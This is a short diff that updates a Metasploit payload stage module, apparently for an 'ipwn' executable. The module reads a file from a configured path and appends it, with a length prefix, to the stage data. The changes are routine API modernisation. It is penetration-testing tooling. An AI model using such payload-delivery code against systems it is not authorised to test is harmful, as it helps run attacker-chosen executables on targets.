@@ -1,13 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
   include Msf::Sessions::CommandShellOptions
 
@@ -141,15 +138,15 @@ module Metasploit3
       [
         OptPath.new('PEXEC', [ true, "Full path to the file to execute",
           File.join(Msf::Config.data_directory, "ipwn", "ipwn")])
-      ], self.class)
+      ])
   end
 
-  def generate_stage
-    data = super
+  def generate_stage(opts={})
+    data = super(opts)
 
     begin
       print_status("Reading executable file #{datastore['PEXEC']}...")
-      buff = ::IO.read(datastore['PEXEC'])
+      buff = ::File.binread(datastore['PEXEC'])
       data << [buff.length].pack("V")
       data << buff
       print_status("Read #{buff.length} bytes...")
@@ -166,5 +163,4 @@ module Metasploit3
     temp = Rex::Text.rand_text_alphanumeric(9)
     data.gsub("msf_stage_xxxxxxxxx.bin", "msf_stage_#{temp}.bin")
   end
-
 end
